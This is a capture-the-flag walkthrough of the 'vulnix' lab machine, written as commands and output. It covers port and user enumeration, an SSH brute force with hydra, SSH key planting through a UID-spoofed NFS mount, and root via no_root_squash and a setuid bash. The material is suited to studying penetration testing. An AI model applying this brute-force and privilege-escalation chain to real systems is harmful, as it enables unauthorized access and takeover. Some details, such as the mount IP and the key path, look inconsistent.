@@ -1,0 +1,212 @@
+###################################################################################################################################################################################################################
+[ 1 ] ENUMERATION
+
+// Port scan
+nmap -sV -T4 -p 1-65535 192.168.1.14
+Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-29 14:20 CEST
+Nmap scan report for 192.168.1.14
+Host is up (0.0018s latency).
+Not shown: 65518 closed ports
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+25/tcp    open  smtp       Postfix smtpd
+79/tcp    open  finger     Linux fingerd
+110/tcp   open  pop3       Dovecot pop3d
+111/tcp   open  rpcbind    2-4 (RPC #100000)
+143/tcp   open  imap       Dovecot imapd
+512/tcp   open  exec       netkit-rsh rexecd
+513/tcp   open  login
+514/tcp   open  tcpwrapped
+993/tcp   open  ssl/imap   Dovecot imapd
+995/tcp   open  ssl/pop3   Dovecot pop3d
+2049/tcp  open  nfs_acl    2-3 (RPC #100227)
+45569/tcp open  status     1 (RPC #100024)
+52272/tcp open  mountd     1-3 (RPC #100005)
+57323/tcp open  mountd     1-3 (RPC #100005)
+58516/tcp open  mountd     1-3 (RPC #100005)
+60045/tcp open  nlockmgr   1-4 (RPC #100021)
+Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
+
+// Service SSH no banner
+ssh root@192.168.1.14
+root@192.168.1.14's password:
+
+// Service SMTP
+netcat 192.168.1.14 25
+220 vulnix ESMTP Postfix (Ubuntu)
+help
+502 5.5.2 Error: command not recognized
+?
+502 5.5.2 Error: command not recognized
+EHLO google.com
+250-vulnix
+250-PIPELINING
+250-SIZE 10240000
+250-VRFY
+250-ETRN
+250-STARTTLS
+250-ENHANCEDSTATUSCODES
+250-8BITMIME
+250 DSN
+!!!!!
+// I use msf scanner
+use auxiliary/scanner/smtp/smtp_enum
+[*] 192.168.1.14:25       - 192.168.1.14:25 Banner: 220 vulnix ESMTP Postfix (Ubuntu)
+[+] 192.168.1.14:25       - 192.168.1.14:25 Users found: , backup, bin, daemon, games, gnats, irc, libuuid, list, lp, mail, man, messagebus, news, nobody, postmaster, proxy, sshd, sync, sys, syslog, user, uucp, www-data
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+// I search for more info about user: "user"
+Login: user           			Name: user
+Directory: /home/user               	Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+
+Login: dovenull       			Name: Dovecot login user
+Directory: /nonexistent             	Shell: /bin/false
+Never logged in.
+No mail.
+No Plan.
+
+
+// Found this exploit but it doesn't work
+https://www.exploit-db.com/exploits/34896/
+
+// Service finger on port 79
+netcat 192.168.1.14 79
+root
+Login: root           			Name: root
+Directory: /root                    	Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+www-data
+Login: www-data       			Name: www-data
+Directory: /var/www                 	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+
+netcat 192.168.1.14 79
+uucp
+Login: uucp           			Name: uucp
+Directory: /var/spool/uucp          	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+
+netcat 192.168.1.14 79
+www-data
+Login: www-data       			Name: www-data
+Directory: /var/www                 	Shell: /bin/sh
+Never logged in.
+No mail.
+No Plan.
+
+
+// Service SMTP Dovecot
+netcat 192.168.1.14 110
++OK Dovecot ready.
+
+netcat 192.168.1.14 110
++OK Dovecot ready.
+user root
+-ERR Plaintext authentication disallowed on non-secure (SSL/TLS) connections.
+
+// Port 514 tcp wrapped
+netcat -vvn 192.168.1.14 513
+Connection to 192.168.1.14 513 port [tcp/*] succeeded!
+
+
+
+###################################################################################################################################################################################################################
+[ 2 ] EXPLOTATION
+
+// Brute Force SSH
+#hydra -l user -P big.txt 192.168.1.14 ssh
+Hydra v8.5 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-07-29 19:45:27
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 20469 login tries (l:1/p:20469), ~1280 tries per task
+[DATA] attacking service ssh on port 22
+[STATUS] 4590.00 tries/min, 4590 tries in 00:01h, 15912 to do in 00:04h, 16 active
+[STATUS] 2260.67 tries/min, 6782 tries in 00:03h, 13720 to do in 00:07h, 16 active
+[ERROR] Can not create restore file (./hydra.restore) - 
+Permission denied
+[STATUS] 1356.86 tries/min, 9498 tries in 00:07h, 11004 to do in 00:09h, 16 active
+[22][ssh] host: 192.168.1.14   login: user   password: letmein
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-07-29 19:56:38
+
+
+###################################################################################################################################################################################################################
+[ 3 ] PRIVILEGE ESCALATION
+
+// Check if the host has shared folders
+showmount --exports 192.168.1.14
+Export list for 192.168.1.14:
+/home/vulnix *
+
+// On my local machine, create a vulnix folder and mount remote vulnix folder there
+mkdir /mnt/vulnix
+mount 192.168.1.15:/home/vulnix /mnt/vulnix
+
+// Create vulnix user with the same user uid
+useradd vulnix -u 2008
+
+// On my local machine, as root
+ssh-keygen -t rsa
+
+// Copy that rsa key to /mnt/vulnix/..sh/authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC646y5x2Ek16LCE9FFuKWC84PUgkKN0N1/w1m0lqiVCGyIH6qvukqD+PmGfRtm5bQlAneiGfLiyDhA5V8pvhHhmIHplYSNgpQGYCighJ6YTxou0P29zWpOEYABVP3o8ByGoOrIYKhzgTD2NxPa/47kugmFUe+HizfP92+GZAfA5YmrTJeUCErZHFjsr+z5QJHO4SbvpQ4cpLHw5cOYmOVcO2VxO7Q8X0zWguteKJz5DGwW1v23aJg4qtWNaxTHrgaLuql8Hpkz4K2plZ1+nw9i6Xc0DvgE8Q3QbAemo2FM7Sl+Kn+ucQ/wDMrr0L/twPJyHk6qpIw2smzTUMWWxIMB root@lockpicker" > authorized_keys
+
+// Then login as vulnix user using ssh without password
+ssh vulnix@192.168.1.14
+
+// Not root, check sudo -l
+vulnix@vulnix:~$ sudo -l
+Matching 'Defaults' entries for vulnix on this host:
+    env_reset,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User vulnix may run the following commands on this host:
+    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+
+// So, let's run:
+sudoedit /etc/exports
+
+// Information:
+//no_root_squash vs root_squash de NFS
+//Al exportar un sistema de ficheros NFS, podemos o no querer que el usuario root del equipo que monta el sistema de ficheros equivalga al root del sistema que lo exporta. Mediante no_root_squash y root_squash lo podemos regular:
+//no_root_squash: Mediante dicha opción desactivamos esta característica de seguridad, permitiendo que el root de los clientes acabe como root en el sistema de ficheros que se exporta (y por lo tanto, en el resto de clientes).
+
+
+[root@lockpicker vulnix]# cp /tmp/bash /mnt/vulnix/bash -v
+'/tmp/bash' -> '/mnt/vulnix/bash'
+[root@lockpicker vulnix]# chmod 4777 bash 
+[root@lockpicker vulnix]# cp /bin/bash /mnt/vulnix/bash2 -v
+'/bin/bash' -> '/mnt/vulnix/bash2'
+[root@lockpicker vulnix]# chmod 4777 bash2
+
+// Execute new shell
+./bash -p
+
+// Check user privileges
+id
+bash-4.4# id
+uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)
+
+// Flag
+bash-4.4# cat trophy.txt 
+cc614640424f5bd60ce5d5264899c3be
+
+###################################################################################################################################################################################################################
+[ + ] INFORMATION
+
+
+###################################################################################################################################################################################################################
